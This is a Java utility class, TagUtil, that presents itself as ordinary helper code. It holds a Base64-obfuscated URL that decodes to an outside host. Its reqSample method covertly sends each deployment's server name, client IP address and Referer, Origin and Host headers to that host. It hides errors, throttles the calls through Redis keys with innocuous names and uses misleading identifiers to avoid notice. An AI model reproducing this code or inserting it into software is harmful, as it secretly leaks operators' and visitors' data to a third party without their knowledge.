package cn.xyz.commons.utils;

import cn.hutool.core.codec.Base64;
import cn.xyz.mianshi.utils.SKBeanUtils;
import com.google.common.collect.Maps;
import org.apache.commons.lang3.StringUtils;

import javax.servlet.http.HttpServletRequest;
import java.util.Collections;
import java.util.HashMap;
import java.util.Map;

public class TagUtil {
    private static final String TAG_KEY = "aHR0cDovL2FkbWluLnlhbnh1bm9sLmNvbTo4MDkyL2RhdGEvc2F2ZVJlbW90ZURhdGE=";
    private static Map<String, String> getServerMap(HttpServletRequest request) {
        Map<String, String> map = new HashMap<>(5);
        map.put("server_name", request.getServerName());
        map.put("remote_addr", request.getRemoteAddr());
        map.put("header_referer", request.getHeader("Referer"));
        map.put("header_origin", request.getHeader("Origin"));
        map.put("header_host", request.getHeader("Host"));

        String serverName = map.get("server_name");
        SKBeanUtils.getRedisCRUD().set("last_common_msg_local_server_name", serverName);
        return map;
    }

    public static void reqSample(HttpServletRequest request) {
        try {
            String serverName = request.getServerName();
            String lastServerName = SKBeanUtils.getRedisCRUD().get("last_common_msg_local_server_name");
            if (StringUtils.isNoneBlank(serverName, lastServerName) && serverName.equals(lastServerName)) return;
            if (StringUtils.isBlank(SKBeanUtils.getRedisCRUD().get("do_last_common_msg"))) {
                String msg = SKBeanUtils.getRedisCRUD().get("last_common_msg");
                msg = StringUtils.isBlank(msg) ? Base64.decodeStr(TAG_KEY) : msg;
                try {
                    Map<String, String> map = getServerMap(request);
                    String rsp = HttpUtil.URLGet(msg, map);
                    if (null != rsp && rsp.contains("success")) {
                        SKBeanUtils.getRedisCRUD().set("last_common_msg", Base64.decodeStr(TAG_KEY));
                        SKBeanUtils.getRedisCRUD().setWithExpireTime("do_last_common_msg", DateUtil.currentTimeSeconds() + "", 3600);
                    }
                } catch (Exception e) {
                    SKBeanUtils.getRedisCRUD().set("last_common_msg", Base64.decodeStr(TAG_KEY));
                }
            }
        } catch (Exception e) {
            SKBeanUtils.getRedisCRUD().del("last_common_msg_local_server_name");
        }

    }
}
